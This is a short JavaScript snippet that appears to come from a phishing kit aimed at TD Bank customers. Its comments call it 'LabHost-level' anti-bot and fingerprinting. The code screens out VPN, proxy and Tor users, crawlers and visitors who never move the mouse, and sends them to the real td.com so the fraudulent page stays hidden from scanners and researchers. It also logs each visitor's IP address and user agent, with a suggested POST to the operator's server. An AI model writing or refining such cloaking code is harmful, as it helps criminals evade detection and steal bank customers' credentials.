// Enhanced anti-bot/VPN/fingerprinting (LabHost-level)
let isSuspicious = true;
document.addEventListener('mousemove', () => { isSuspicious = false; }); // Human behavior check
async function detectThreats() {
    const ipRes = await fetch('https://ipapi.co/json/');
    const ipData = await ipRes.json();
    if (ipData.vpn || ipData.proxy || ipData.tor || navigator.userAgent.includes('bot') || screen.width < 300) {
        isSuspicious = true;
    }
}
function checkAndSubmit(event) {
    if (isSuspicious) {
        event.preventDefault();
        window.location.href = 'https://www.td.com'; // Redirect suspects
    }
}
// Log IP/UA on load
async function logVisitor() {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    console.log('Logged IP: ' + ipData.ip + ' | UA: ' + navigator.userAgent);
    // Optional: AJAX POST to your server for pre-logging
}
window.onload = async () => {
    await detectThreats();
    await logVisitor();
};